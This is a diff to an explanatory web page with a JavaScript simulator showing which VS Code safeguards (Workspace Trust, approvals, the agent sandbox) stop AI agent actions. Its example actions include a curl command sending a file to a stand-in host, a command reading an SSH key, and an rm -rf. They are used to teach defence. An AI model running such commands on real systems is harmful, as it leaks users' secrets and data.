@@ -42,7 +42,7 @@ code,.mono{font-family:var(--mono);font-size:.9em;overflow-wrap:anywhere}
 
 .top{display:flex;justify-content:space-between;gap:16px;padding:18px 0;border-bottom:1px solid var(--line);font-size:.85rem;color:var(--muted)}
 .hero{padding:clamp(36px,7vw,84px) 0 clamp(28px,4vw,48px);border-bottom:3px solid var(--rule)}
-.hero .lede{max-width:44ch;margin-top:20px;font-size:clamp(1.05rem,1.7vw,1.25rem)}
+.hero .lede{margin-top:20px;font-size:clamp(1.05rem,1.7vw,1.25rem)}
 section{padding:clamp(32px,5vw,56px) 0;border-bottom:1px solid var(--line)}
 .ph{margin-bottom:22px}
 .ph .lbl{margin-bottom:6px}
@@ -91,27 +91,26 @@ ol.gates::before{content:"";position:absolute;left:35px;top:0;bottom:0;border-le
 .gate{display:grid;grid-template-columns:72px minmax(0,1fr);padding:18px 0;border-bottom:1px solid var(--line);transition:opacity .25s}
 .gate:last-child{border-bottom:0}
 .gate .body{grid-column:2}
-.gate.wait{opacity:.32}
+.gate.wait .state{color:var(--muted)}
 .gate .state{font:600 .72rem/1.3 var(--mono);letter-spacing:.08em;text-transform:uppercase;margin:3px 0 6px}
 .gate.stop .state{color:var(--red)}
 .gate.ask .state::before{content:"? "}
 .gate.stop .state::before{content:"× "}
 .gate.pass .state::before{content:"→ "}
-.gate .say{max-width:56ch}
-.gate blockquote{margin:10px 0 0;padding:0 0 0 12px;border-left:2px solid var(--line);font-size:.86rem;color:var(--muted);max-width:60ch}
+.gate blockquote{margin:10px 0 0;padding:0 0 0 12px;border-left:2px solid var(--line);font-size:.86rem;color:var(--muted);overflow-wrap:anywhere}
 .gate.stop blockquote{border-left-color:var(--red)}
 .gate blockquote + blockquote{margin-top:8px}
-.gate blockquote a{white-space:nowrap}
 .bot{position:absolute;left:0;top:0;width:72px;text-align:center;font:600 .82rem/1 var(--mono);background:var(--bg);padding:5px 0;z-index:1;transform:translateY(20px);white-space:nowrap}
 @media (prefers-reduced-motion:no-preference){.bot{transition:transform .38s cubic-bezier(.3,.7,.2,1)}}
 .bot.stop{color:var(--red)}
-.scope{margin-top:14px;font-size:.82rem;color:var(--muted)}
+.scope{margin-bottom:14px;font-size:.88rem;color:var(--muted)}
+.evidence-tag{font:600 .72rem/1.3 var(--mono)}
 
 /* lists */
 .rows{border-top:1px solid var(--rule)}
 .row{display:grid;grid-template-columns:minmax(0,4fr) minmax(0,7fr);gap:8px 32px;padding:16px 0;border-bottom:1px solid var(--line)}
 .row blockquote{margin:0;font-size:.9rem;color:var(--muted)}
-.row blockquote a{white-space:nowrap}
+.row blockquote{overflow-wrap:anywhere}
 @media (max-width:700px){.row{grid-template-columns:1fr}}
 .tbl{overflow-x:auto}
 table{border-collapse:collapse;width:100%;font-size:.93rem}
@@ -140,11 +139,11 @@ a.sec-link:focus-visible{outline:2px solid currentColor;outline-offset:3px;borde
 </head>
 <body>
 <div class="page">
-  <div class="top"><a href="index.html">Kim Syversen</a><span>Current as of <time datetime="2026-11-26">26 Nov 2026</time></span></div>
+  <div class="top"><a href="index.html">Kim Syversen</a><span>Current as of <time datetime="2026-11-28">28 Nov 2026</time></span></div>
 
   <header class="hero">
     <h1>Which VS Code safeguards stop an AI agent?</h1>
-    <p class="lede">Workspace Trust determines whether an agent can start. Once it starts, approval rules determine when it needs your permission. Sandboxing limits the files and network destinations a covered process can reach.</p>
+    <p class="lede">In VS Code editor chat with the Copilot harness, Workspace Trust controls whether agents are enabled in the workspace. Approval rules determine when you are asked to let a tool run. The agent sandbox limits access to files and network destinations for the operations it covers.</p>
   </header>
 
   <section id="two-questions">
@@ -158,14 +157,16 @@ a.sec-link:focus-visible{outline:2px solid currentColor;outline-offset:3px;borde
       <div>
         <p class="lbl">Sandbox</p>
         <p class="q">&ldquo;Which resources can this covered process access when it runs?&rdquo;</p>
-        <p>The sandbox limits a command while it runs, also after you said yes.</p>
+        <p>Approving a command leaves its sandbox restrictions in place. If a sandboxed operation needs to retry outside the sandbox, that retry requires a separate approval.</p>
       </div>
     </div>
-    <p class="src" style="margin-top:14px">Both quotes: <a href="https://code.visualstudio.com/docs/agents/concepts/trust-and-safety#_agent-sandboxing">Trust and safety for AI agents</a>.</p>
+    <p class="src" style="margin-top:14px">See <a href="https://code.visualstudio.com/docs/agents/concepts/trust-and-safety#_agent-sandboxing">Trust and safety for AI agents</a> and <a href="https://code.visualstudio.com/docs/agents/run/approvals#_sandbox-agent-commands">Sandbox agent commands</a>.</p>
   </section>
 
   <section id="course">
     <div class="ph"><h2 id="h-course"><a class="sec-link" href="#h-course">Try it: pick an action and settings, see what happens</a></h2></div>
+    <p class="scope">This simulator runs no commands or tools. It assumes built-in tools on supported local macOS or Linux with Bash, the project as the working directory, default approval, sandbox path and network rules except where modeled, and no saved approvals or managed policy. For blocked commands, it models a one-time request to run outside the sandbox. VS Code can also <a href="https://code.visualstudio.com/docs/agents/run/agent-sandboxing#_choose-the-scope-of-a-path-approval">offer access to a specific path</a> so a command can retry inside the sandbox.</p>
+    <p class="scope">In a trusted workspace, the MCP example assumes Copilot starts a local stdio server from the project’s <code>.mcp.json</code> under the selected sandbox setting, with <code>chat.agent.sandbox.mcpServers</code> at its default. Startup is separate from tool approval. Server connectivity and <a href="https://code.visualstudio.com/docs/agents/run/manage-mcp-servers#_sandbox-mcp-servers">per-server sandboxing</a> are outside this example.</p>
     <div class="sim">
       <form id="ctl" autocomplete="off">
         <fieldset class="grp acts" id="f-act"><legend class="lbl">Action the agent tries</legend></fieldset>
@@ -174,9 +175,10 @@ a.sec-link:focus-visible{outline:2px solid currentColor;outline-offset:3px;borde
         <fieldset class="grp" id="f-judge"><legend class="lbl">The AI reviewer&rsquo;s answer (Assisted only)</legend><div class="opts" data-k="judge"></div></fieldset>
         <fieldset class="grp" id="f-env"><legend class="lbl">Rule for <span class="mono" style="text-transform:none;letter-spacing:0">.env</span> edits</legend><div class="opts" data-k="env"></div></fieldset>
         <fieldset class="grp" id="f-sandbox"><legend class="lbl">Sandbox</legend><div class="opts" data-k="sandbox"></div></fieldset>
-        <fieldset class="grp" id="f-net"><legend class="lbl">Sandbox network</legend><div class="opts" data-k="net"></div></fieldset>
-        <fieldset class="grp" id="f-esc"><legend class="lbl">Run outside the sandbox</legend><div class="opts" data-k="esc"></div></fieldset>
-        <fieldset class="grp" id="f-answer"><legend class="lbl">Your answer when VS Code asks</legend><div class="opts" data-k="answer"></div></fieldset>
+        <fieldset class="grp" id="f-net"><legend class="lbl">Sandbox outbound network</legend><div class="opts" data-k="net"></div></fieldset>
+        <fieldset class="grp" id="f-esc"><legend class="lbl">Requests to run outside the sandbox</legend><div class="opts" data-k="esc"></div></fieldset>
+        <fieldset class="grp" id="f-answer"><legend class="lbl">Your answer to the tool request</legend><div class="opts" data-k="answer"></div></fieldset>
+        <fieldset class="grp" id="f-retry"><legend class="lbl">Your answer to the outside-sandbox request</legend><div class="opts" data-k="retry"></div></fieldset>
         <div class="presets" id="presets"></div>
       </form>
 
@@ -186,12 +188,11 @@ a.sec-link:focus-visible{outline:2px solid currentColor;outline-offset:3px;borde
           <span class="bot" id="bot" aria-hidden="true">[•_•]</span>
           <ol class="gates" id="gates">
             <li class="gate" data-g="trust"><div class="body"><h3 id="gate-trust"><a class="sec-link" href="#gate-trust">1. Is the workspace trusted?</a></h3><div class="out"></div></div></li>
-            <li class="gate" data-g="approval"><div class="body"><h3 id="gate-approval"><a class="sec-link" href="#gate-approval">2. Does VS Code ask you first?</a></h3><div class="out"></div></div></li>
-            <li class="gate" data-g="sandbox"><div class="body"><h3 id="gate-sandbox"><a class="sec-link" href="#gate-sandbox">3. Does the sandbox block it?</a></h3><div class="out"></div></div></li>
+            <li class="gate" data-g="approval"><div class="body"><h3 id="gate-approval"><a class="sec-link" href="#gate-approval">2. Does the tool call need your approval?</a></h3><div class="out"></div></div></li>
+            <li class="gate" data-g="sandbox"><div class="body"><h3 id="gate-sandbox"><a class="sec-link" href="#gate-sandbox">3. What access does the sandbox allow?</a></h3><div class="out"></div></div></li>
             <li class="gate" data-g="review"><div class="body"><h3 id="gate-review"><a class="sec-link" href="#gate-review">4. Can you undo it?</a></h3><div class="out"></div></div></li>
           </ol>
         </div>
-        <p class="scope">These examples use the Copilot harness in editor chat with its default tools and a local Unix shell. They assume no prior grants or organization policy. When allowed, the example agent requests a one-time retry outside the sandbox, without first offering path approval. The MCP example uses a workspace-configured server started by VS Code, with the default <span class="mono">chat.agent.sandbox.mcpServers</span> setting. Per-server MCP sandboxing is a separate feature and is not modelled. The MCP example also ignores the sandbox network setting and the request to run outside the sandbox.</p>
       </div>
     </div>
   </section>
@@ -222,11 +223,11 @@ a.sec-link:focus-visible{outline:2px solid currentColor;outline-offset:3px;borde
       <li><span>Review a project before trusting it.</span></li>
       <li><span>Confirm the session&rsquo;s workspace and execution environment.</span></li>
       <li><span>Choose an appropriate permission level.</span></li>
-      <li><span>Restrict command access and verify it.</span></li>
+      <li><span>Restrict command access and verify it. Run <a href="https://code.visualstudio.com/docs/agents/run/agent-sandboxing#_inspect-the-effective-sandbox-policy"><code>/sandbox policy</code></a> to check the execution machine and effective restrictions.</span></li>
       <li><span>Limit tools and credentials to the task.</span></li>
       <li><span>Review changes before integrating them.</span></li>
     </ol>
-    <p class="src" style="margin-top:14px">Step names quoted from <a href="https://code.visualstudio.com/docs/agents/run/security#_recommended-security-baseline">Recommended security baseline</a>.</p>
+    <p class="src" style="margin-top:14px">Step names come from <a href="https://code.visualstudio.com/docs/agents/run/security#_recommended-security-baseline">Recommended security baseline</a>.</p>
   </section>
 
   <section id="sources">
@@ -242,11 +243,15 @@ a.sec-link:focus-visible{outline:2px solid currentColor;outline-offset:3px;borde
       <li><a href="https://github.com/microsoft/vscode/tree/d03edc4b18d687c45af067195bad9544b5b07475">VS Code source code</a>, commit <code>d03edc4</code> of 15 Nov 2026</li>
       <li><a href="https://github.com/github/copilot-sdk/tree/v1.0.33-preview.0">GitHub Copilot SDK source code</a>, preview release <code>v1.0.33-preview.0</code></li>
     </ul>
-    <p class="src" style="margin-top:14px">Documentation and source code checked on 26 Nov 2026.</p>
+    <p class="src" style="margin-top:14px">Documentation and source code checked on 28 Nov 2026.</p>
   </section>
 
   <footer>
     <p class="ai-note"><b>Made with AI</b><span>This page was written with the help of AI. Its content has not necessarily been fully quality checked by a human.</span></p>
+    <section id="tag-key">
+      <h2 id="h-tag-key"><a class="sec-link" href="#h-tag-key">Tags on this page</a></h2>
+      <p><span class="evidence-tag">inference</span> is interpretation by AI that is not stated in a source.</p>
+    </section>
   </footer>
 </div>
 
@@ -260,14 +265,15 @@ var N={ts:"Trust and safety",ap:"Approvals",sb:"Agent sandboxing",se:"AI securit
 var Q={
 restricted:["wt","Opening a workspace in restricted mode disables agents in that workspace."],
 trustcert:["ts","Trust permits access or execution; it doesn't certify that every result or action is safe."],
-manual:["ap","With Manual permissions, you review actions that aren't already approved."],
+manual:["ap","With Manual permissions, you review actions that aren't already approved.",D+"agents/run/approvals#_copilot-approvals"],
 assisted:["ap","Assisted permissions uses a model to decide which actions need your review."],
-assistedrisk:["ap","The reviewer can make mistakes."],
+assistedrisk:["ap","The reviewer can make mistakes.",D+"agents/run/approvals#_permission-levels"],
 all:["ap","Allow all skips ordinary tool confirmations."],
 termdefault:["ap","If neither an explicit rule nor a saved approval matches, built-in rules allow some commands to run automatically and require confirmation for others."],
 runtime:["ap","The runtime can approve a read-only or sandboxed command without checking terminal rules."],
 besteffort:["ts","Auto-approval rules use best-effort command parsing. A command matching a rule isn't proof that its effects are safe."],
-fetchonce:["ap","Review the destination in the web fetch prompt."],
+fetchonce:["ap","Review the destination in the web fetch prompt.",D+"agents/run/approvals#_url-approval"],
+fetchcontent:["ap","Approving the request doesn't mean you trust the content the site returns.",D+"agents/run/approvals#_url-approval"],
 sensitive:["rv","uses glob patterns to request confirmation before an edit is saved."],
 envdefault:["src","'**/{package.json,server.xml,build.rs,web.config,.gitattributes,.env,Cargo.toml}': false,","https://github.com/microsoft/vscode/blob/d03edc4b18d687c45af067195bad9544b5b07475/src/vs/platform/chat/common/chatSettings.ts#L141"],
 assistedwrite:["src","return attributePermissionResult({ kind: 'approve-once' }, 'assisted_approval');","https://github.com/microsoft/vscode/blob/d03edc4b18d687c45af067195bad9544b5b07475/src/vs/platform/agentHost/node/copilot/copilotAgentSession.ts#L8741-L8772"],
@@ -276,13 +282,16 @@ sboff:["sb","The default is off."],
 cwd:["sb","The working directory is writable by default, but it isn't the only location the sandbox can access."],
 ssh:["ts","It protects sensitive locations, such as SSH keys and shell configuration, and applies to child processes such as package managers and build scripts."],
 netopen:["sb","Turning on sandboxing doesn't block outbound network access by default."],
-netblock:["sb","To block outbound access, set chat.agent.sandbox.network.allowNetwork to false."],
+netblock:["sb","To block outbound access, set chat.agent.sandbox.network.allowNetwork to false.",D+"agents/run/agent-sandboxing#_configure-network-access"],
 escask:["sb","If the command can't run inside the sandbox, the agent can request Allow Outside Sandbox when your settings and organization permit it."],
 escoff:["sb","requests to run outside the sandbox fail instead of prompting."],
 escyes:["sb","Approving execution outside the sandbox removes its file and network restrictions for that operation."],
 notcovered:["ts","The agent's read, edit, and write tools use VS Code's permission system directly.",D+"agents/concepts/trust-and-safety#:~:text=read%2C%20edit%2C%20and%20write%20tools"],
 indep:["ap","For example, even with Allow all, a command can't write to a folder the sandbox marks read-only."],
-keep:["rv","Pending edits are already saved to disk, so running your application or tests uses the changed files."],
+keep:["rv","Pending edits are already saved to disk, so running your application or tests uses the changed files.",D+"agents/run/review-code-edits#_review-pending-edits-with-the-working-set"],
+workingSet:["rv","Editor working set is experimental and might change or be removed.",D+"agents/run/review-code-edits#_configure-review-controls"],
+recover:["rv","Reverts selected repository changes without changing the conversation.",D+"agents/run/review-code-edits#_undo-changes-at-the-right-scope"],
+external:["rv","Reverses effects that checkpoints and Git don't control.",D+"agents/run/review-code-edits#_undo-changes-at-the-right-scope"],
 noundo:["ts","Stopping a request or restoring workspace files doesn't reverse completed terminal commands, network requests, deployments, or changes to external services."],
 notvm:["sb","Sandboxing isn't a virtual machine, a user-account boundary, or a replacement for endpoint security.",D+"agents/run/agent-sandboxing#:~:text=virtual%20machine%2C%20a%20user%2Daccount%20boundary"],
 devtool:["sb","It permits reading tool directories on PATH, toolchain directories, developer-tool configuration and caches, including registry tokens."],
@@ -290,6 +299,7 @@ nosilent:["sb","If a required operating system dependency is missing, commands d
 worktree:["ts","It doesn't restrict commands, network access, or access to other files.",D+"agents/concepts/trust-and-safety#:~:text=restrict%20commands%2C%20network%20access"],
 ext:["wt","Workspace Trust can't prevent a malicious extension from executing code and ignoring Restricted Mode.",D+"editing/workspaces/workspace-trust#:~:text=prevent%20a%20malicious%20extension"],
 mcp:["mcp","In a trusted workspace, they can start without a separate MCP trust prompt, including after configuration changes."],
+mcprestricted:["mcp","Restricted mode prevents these servers from starting.",D+"agents/run/manage-mcp-servers#_mcp-server-trust"],
 platwhere:["sb","For a remote agent session, prerequisites and paths refer to the remote machine, not the computer displaying chat."],
 fatigue:["ts","Repeatedly approving commands can cause you to pay less attention to what you're approving, especially during long agent sessions."],
 rulecat:["src","cat: true","https://github.com/microsoft/vscode/blob/d03edc4b18d687c45af067195bad9544b5b07475/src/vs/platform/terminal/common/autoApprove/defaultAutoApproveRules.ts#L32-L39"],
@@ -303,8 +313,8 @@ writeauto:["src","if (this._isEditAutoApproved(writeResources, workingDirectorie
 sbonly:["src","if (enabledRaw !== AgentSandboxEnabledValue.On) {","https://github.com/microsoft/vscode/blob/d03edc4b18d687c45af067195bad9544b5b07475/src/vs/platform/agentHost/node/copilot/sandboxConfigForSdk.ts#L139-L141"],
 netfwd:["src","...(typeof allowNetwork === 'boolean' ? { allowOutbound: allowNetwork } : {}),","https://github.com/microsoft/vscode/blob/d03edc4b18d687c45af067195bad9544b5b07475/src/vs/platform/agentHost/node/copilot/sandboxConfigForSdk.ts#L187"],
 bypassfwd:["src","const allowBypass = sandbox?.[AgentHostSandboxKey.AllowUnsandboxedCommands];","https://github.com/microsoft/vscode/blob/d03edc4b18d687c45af067195bad9544b5b07475/src/vs/platform/agentHost/node/copilot/sandboxConfigForSdk.ts#L160"],
-fetchbypass:["sdk","True when the tool is asking to run this URL fetch outside the sandbox, after the network policy denied the approved URL or the sandbox proxy could not reach it (host opted in via sandbox.allowBypass).","https://github.com/github/copilot-sdk/blob/v1.0.33-preview.0/nodejs/src/generated/session-events.ts#L12840"],
-fetchgrant:["sdk","This is a request, not a grant: the fetch runs only if the user approves this permission request.","https://github.com/github/copilot-sdk/blob/v1.0.33-preview.0/nodejs/src/generated/session-events.ts#L12840"],
+fetchbypass:["sdk","True when the tool is asking to run this URL fetch outside the sandbox, after the network policy denied the approved URL or the sandbox proxy could not reach it (host opted in via sandbox.allowBypass).","https://github.com/github/copilot-sdk/blob/v1.0.33-preview.0/nodejs/src/generated/session-events.ts#L12840-L12842"],
+fetchgrant:["sdk","This is a request, not a grant: the fetch runs only if the user approves this permission request.","https://github.com/github/copilot-sdk/blob/v1.0.33-preview.0/nodejs/src/generated/session-events.ts#L12840-L12842"],
 allsens:["rv","Allow all, global auto-approval, or an applicable saved approval for the exact file can allow an edit without another prompt."],
 sandboxauto:["src","Auto-approve shell commands that run sandboxed by default","https://github.com/microsoft/vscode/blob/d03edc4b18d687c45af067195bad9544b5b07475/src/vs/platform/agentHost/node/copilot/copilotAgentSession.ts#L8886-L8894"],
 mcpbroad:["se","Extensions, plugins, MCP servers, skills, and hooks can include code that runs in your environment."],
@@ -313,7 +323,7 @@ mcpown:["sb","These controls don't cover servers you start independently.",D+"ag
 creds:["sb","They let sandboxed processes use your credentials for HTTPS Git operations and the GitHub CLI.",D+"agents/run/agent-sandboxing#:~:text=They%20let%20sandboxed%20processes%20use%20your%20credentials"],
 sensrules:["rv","These rules don't prevent file reads or protect against every write made through terminal commands or other tools.",D+"agents/run/review-code-edits#:~:text=These%20rules%20don%27t%20prevent%20file%20reads"],
 sessbypass:["sb","A session-wide bypass also removes those restrictions from subsequent terminal commands until you turn sandboxing back on.",D+"agents/run/agent-sandboxing#:~:text=A%20session%2Dwide%20bypass%20also%20removes"],
-bypass:["src","Sandbox bypass requires confirmation","https://github.com/microsoft/vscode/blob/d03edc4b18d687c45af067195bad9544b5b07475/src/vs/platform/agentHost/node/sessionPermissions.ts#L253-L256"]
+bypass:["src","Sandbox bypass requires confirmation","https://github.com/microsoft/vscode/blob/d03edc4b18d687c45af067195bad9544b5b07475/src/vs/platform/agentHost/node/sessionPermissions.ts#L253-L292"]
 };
 function esc(s){return s.replace(/&/g,"&amp;").replace(/</g,"&lt;")}
 function qlink(id){
@@ -328,42 +338,49 @@ function quote(id){return '<blockquote>&ldquo;'+esc(Q[id][1])+'&rdquo; <a href="
 var ACTS=[
  {id:"status",kind:"term",cmd:"git status",what:"Look at the repo",done:"The command can report repository status."},
  {id:"rm",kind:"term",cmd:"rm -rf dist",what:"Delete a folder in the project",done:"The command can remove dist from the project."},
- {id:"ssh",kind:"term",cmd:"cat ~/.ssh/id_ed25519",what:"Read your SSH key",done:"The command can read the key if your account has access."},
+ {id:"ssh",kind:"term",cmd:"cat ~/.ssh/example_key",what:"Read an example SSH key",done:"The command can read the file if it exists and your account has access."},
  {id:"curl",kind:"term",cmd:"curl -d @notes.txt https://paste.example",what:"Send a file to another server",done:"The command can attempt to send notes.txt to the example destination."},
- {id:"env",kind:"edit",cmd:"edit .env",what:"Change a file with secrets, using the edit tool",done:"The edit can change .env on disk before review."},
+ {id:"env",kind:"edit",cmd:"edit .env",what:"Edit a project .env file with the built-in edit tool",done:"The edit can change .env on disk before review."},
  {id:"fetch",kind:"fetch",cmd:"fetch https://example.com/docs",what:"Read a web page, using the fetch tool",done:"A successful fetch can add untrusted page content to the chat."},
  {id:"mcp",kind:"mcp",cmd:"mcp: create_issue",what:"Call a tool on a local MCP server",done:"The server can attempt to create the issue with its available permissions and network access."}
 ];
 /* The VS Code setting behind a control, and the docs page that names it. */
-var SETS={level:["chat.defaultConfiguration","ap"],env:["chat.tools.edits.autoApprove","rv"],sandbox:["chat.agent.sandbox.enabled","sb"],net:["chat.agent.sandbox.network.allowNetwork","sb"],esc:["chat.agent.sandbox.allowUnsandboxedCommands","sb"]};
+var SETS={level:["chat.defaultConfiguration","ap","New-session default (approvals)"],env:["chat.tools.edits.autoApprove","rv"],sandbox:["chat.agent.sandbox.enabled","sb","New-session default"],net:["chat.agent.sandbox.network.allowNetwork","sb"],esc:["chat.agent.sandbox.allowUnsandboxedCommands","sb"]};
 var OPTS={
  trust:[["trusted","Trusted"],["restricted","Restricted Mode"]],
  level:[["manual","Manual"],["assisted","Assisted"],["all","Allow all"]],
  judge:[["yes","Yes"],["no","No"]],
  env:[["on","Ask first (default)"],["off","Allow"]],
  sandbox:[["off","Off"],["on","On"]],
- net:[["open","Open"],["blocked","Blocked"]],
+ net:[["open","Allowed"],["blocked","Blocked"]],
  esc:[["ask","May ask"],["never","Never"]],
- answer:[["yes","Yes"],["no","No"]]
+ answer:[["yes","Yes"],["no","No"]],
+ retry:[["yes","Yes"],["no","No"]]
 };
+var DEFAULTS={trust:"trusted",level:"manual",judge:"yes",env:"on",sandbox:"off",net:"open",esc:"ask",answer:"yes",retry:"yes"};
 var PRESETS=[
- ["Manual, trusted workspace",{trust:"trusted",level:"manual",env:"on",sandbox:"off",net:"open",esc:"ask"}],
- ["Allow all, no sandbox",{trust:"trusted",level:"all",env:"on",sandbox:"off",net:"open",esc:"ask",answer:"yes"}],
- ["Sandbox, network blocked",{trust:"trusted",level:"manual",env:"on",sandbox:"on",net:"blocked",esc:"never"}]
+ ["Manual, trusted workspace",{}],
+ ["Allow all, no sandbox",{level:"all"}],
+ ["Sandbox, outbound blocked",{sandbox:"on",net:"blocked",esc:"never"}]
 ];
-var st={act:"curl",trust:"trusted",level:"manual",judge:"yes",env:"on",sandbox:"off",net:"open",esc:"ask",answer:"yes"};
+var st=Object.assign({act:"curl"},DEFAULTS);
 
 /* The rules. Each gate returns a state, a sentence and the quotes behind it. */
 function evaluate(s){
-  var a=ACTS.filter(function(x){return x.id===s.act})[0],term=a.kind==="term",g=[],asks=0,ran=true,why="",fenced=false;
-  function push(gate,state,say,qs){g.push({g:gate,state:state,say:say,qs:qs||[]})}
-  function asked(gate,say,qs,noSay,noQs){
+  var a=ACTS.filter(function(x){return x.id===s.act})[0],term=a.kind==="term",g=[],asks=0;
+  function push(gate,state,say,qs,tag){g.push({g:gate,state:state,say:say,qs:qs||[],tag:tag})}
+  function asked(gate,say,qs,tag){
     asks++;
-    if(s.answer==="no"){push(gate,"stop",noSay||(say+" You say no."),noQs||qs);ran=false;why="no";return false}
-    push(gate,"ask",say+" You say yes.",qs);return true;
+    var answer=gate==="sandbox"?s.retry:s.answer;
+    push(gate,answer==="yes"?"ask":"stop",say+(answer==="yes"?" You say yes.":" You say no."),qs,tag);
+    return answer==="yes";
   }
   // 1 trust
-  if(s.trust==="restricted"){push("trust","stop","The workspace is in Restricted Mode, so agents are turned off.",["restricted"]);return{g:g,ran:false,why:"trust",asks:0,a:a}}
+  if(s.trust==="restricted"){
+    if(a.id==="mcp") push("trust","stop","Restricted Mode disables agents and prevents this workspace-configured MCP server from starting.",["restricted","mcprestricted"]);
+    else push("trust","stop","The workspace is in Restricted Mode, so agents are turned off.",["restricted"]);
+    return{g:g,ran:false,why:"trust",asks:0,a:a};
+  }
   push("trust","pass","The workspace is trusted, so the agent is allowed to work in it.",["trustcert"]);
   // 2 approval
   var ok=true;
@@ -376,63 +393,80 @@ function evaluate(s){
     else if(a.id==="env"&&s.env==="on") push("approval","judge","An AI reviewer checked the action and approved it, so the .env rule is skipped.",["assisted","assistedcond","assistedwrite"]);
     else push("approval","judge","An AI reviewer checked the action and approved it. VS Code does not ask you.",["assisted","assistedrisk"]);
   }
-  else if(term&&s.sandbox==="on") push("approval","pass","VS Code does not ask, because the command runs inside the sandbox.",["runtime","sandboxauto"]);
+  else if(term&&s.sandbox==="on") push("approval","pass","VS Code auto-approves the initial attempt because the command is set to run inside the sandbox.",["runtime","sandboxauto"]);
   else if(a.id==="status") push("approval","pass","The default rules allow git status without prompting.",["gitstatus","termdefault"]);
   else if(a.id==="rm") ok=asked("approval","rm is on the built-in list of commands that need approval, so VS Code asks you.",["rulerm","termdefault"]);
   else if(a.id==="ssh") push("approval","pass","cat is on the built-in list of read-only commands, so it runs without asking you.",["rulecat","termdefault","shellrule"]);
   else if(term) ok=asked("approval","curl is on the built-in list of commands that need approval, so VS Code asks you.",["rulecurl","termdefault"]);
   else if(a.id==="env"){
-    if(s.env==="on") ok=asked("approval","A default rule covers .env, so VS Code asks you before the edit is saved.",["envdefault","sensitive"]);
-    else push("approval","pass","Your rule allows .env edits, so the edit is saved without asking you.",["sensitive","envoverride","writeauto"]);
+    if(s.env==="on") ok=asked("approval","A default rule covers .env, so VS Code asks before allowing the edit.",["envdefault","sensitive"]);
+    else push("approval","pass","Your rule allows this .env edit without a prompt.",["sensitive","envoverride","writeauto"]);
   }
   else if(a.id==="mcp") ok=asked("approval","This MCP tool has no prior approval. VS Code asks before calling it.",["manual"]);
   else ok=asked("approval","VS Code asks you before fetching from this host.",["fetchonce"]);
-  if(!ok) return{g:g,ran:false,why:why,asks:asks,a:a};
+  if(!ok) return{g:g,ran:false,why:"no",asks:asks,a:a};
   // 3 sandbox
   if(a.id==="mcp"){
-    if(s.sandbox==="off") push("sandbox","open","The agent sandbox is off, so this local MCP server is not sandboxed. It can run code in your environment.",["mcpbroad"]);
-    else{fenced=true;push("sandbox","pass","VS Code started the server inside the sandbox. The agent sandbox does not cover independently started servers.",["mcpsb","mcpown"])}
-  } else if(a.id==="env") push("sandbox","skip","The edit tool uses VS Code’s permission system directly.",["notcovered"]);
-  else if(s.sandbox==="off"){
+    if(s.sandbox==="off") push("sandbox","open","The local server runs outside the agent sandbox. Its own permissions govern what it can do.",["sbonly","mcpbroad"]);
+    else push("sandbox","covered","Copilot started the server inside the agent sandbox. The outcome of the call depends on the server’s access.",["mcpsb","mcpown"]);
+  } else if(a.id==="env"){
+    if(s.sandbox==="on") push("sandbox","pass","The edit stays within the default writable working directory. Step 2 covers the edit tool’s approval.",["cwd","notcovered"]);
+    else push("sandbox","open","Step 2 covers the edit tool’s approval.",["sboff","notcovered"]);
+  } else if(s.sandbox==="off"){
     if(a.id==="fetch") push("sandbox","open","The sandbox is off, which is the default, so no sandbox network rule applies to the fetch.",["sboff","sbonly"]);
     else push("sandbox","open","The sandbox is off, which is the default. The sandbox does not limit which files or network destinations the command can reach.",["sboff","privs"]);
   } else {
     var web=a.id==="fetch",blocked=(a.id==="ssh")||((a.id==="curl"||web)&&s.net==="blocked");
     if(!blocked){
-      fenced=true;
-      if(web) push("sandbox","pass","The sandbox allows network access by default, so its network rules do not deny this fetch.",["netopen","netfwd"]);
-      else if(a.id==="curl") push("sandbox","pass","The sandbox allows network access by default, so the command can attempt the transfer.",["netopen"]);
+      if(web) push("sandbox","pass","The example assumes the outbound policy allows this fetch under the default domain and local network rules.",["netopen","netfwd"],"inference");
+      else if(a.id==="curl") push("sandbox","pass","The outbound rule allows the command to attempt the transfer.",["netopen"]);
       else push("sandbox","pass","The sandbox permits access to the project folder."+(s.level==="all"?" Its limits still apply with Allow all.":""),s.level==="all"?["cwd","indep"]:["cwd"]);
     } else {
       var bq=a.id==="ssh"?["ssh"]:web?["fetchbypass","netfwd"]:["netblock"];
-      var bs=a.id==="ssh"?"The sandbox blocks it. SSH keys are among the sensitive locations it protects.":web?"The sandbox network policy denies the fetch, because network access is turned off.":"The sandbox blocks it. Network access is turned off.";
-      if(s.esc==="never"){push("sandbox","stop",bs+" Asking to run outside the sandbox is turned off.",bq.concat(web?["escoff","bypassfwd"]:["escoff"]));return{g:g,ran:false,why:"fence",asks:asks,a:a}}
-      var want=bs+(web?" The fetch tool":" The agent")+" asks to run it outside the sandbox"+(s.level==="all"?", also with Allow all.":".");
-      var wq=bq.concat(web?["fetchgrant"]:["escask"],s.level==="all"?["bypass"]:[]);
-      ok=asked("sandbox",want,wq.concat(["escyes"]),want+" You say no.",wq);
+      var bs=a.id==="ssh"?"The sandbox blocks it. SSH keys are among the sensitive locations it protects.":web?"The example assumes the outbound policy blocks this fetch.":"The sandbox blocks outbound access for this command.";
+      var tag=web?"inference":undefined;
+      if(s.esc==="never"){
+        push("sandbox","stop",bs+" Requests to run outside the sandbox are disabled.",bq.concat(web?["escoff","bypassfwd"]:["escoff"]),tag);
+        return{g:g,ran:false,why:"fence",asks:asks,a:a};
+      }
+      var want=bs+(web?" In this example the fetch tool":" The example agent")+" requests a retry outside the sandbox.";
+      var wq=bq.concat(web?["fetchgrant"]:["escask"],["bypass"]);
+      ok=asked("sandbox",want,s.retry==="yes"?wq.concat(["escyes"]):wq,tag);
       if(!ok) return{g:g,ran:false,why:"fence-no",asks:asks,a:a};
     }
   }
   // 4 afterwards
-  if(a.id==="env") push("review","after","You can choose Keep or Undo, but the file is already saved on disk.",["keep"]);
-  else if(a.id==="status") push("review","after","Nothing changes, so there is nothing to undo.",[]);
-  else push("review","after","Restoring workspace files does not reverse this tool call.",["noundo"]);
-  return{g:g,ran:true,asks:asks,a:a,fenced:fenced};
+  var review={
+    env:["If the edit succeeds, it is saved before review. For edits tracked in the experimental working set, Keep retains the change and Undo reverts it.",["keep","workingSet"]],
+    status:["There is no content edit to undo.",[]],
+    rm:["Git can recover a tracked file from an available revision. For deleted files outside Git, recovery depends on a backup or another copy.",["recover"]],
+    ssh:["Undo cannot take back information the tool has already read.",["noundo"]],
+    curl:["Restoring local files does not retract data already sent to a server.",["noundo"]],
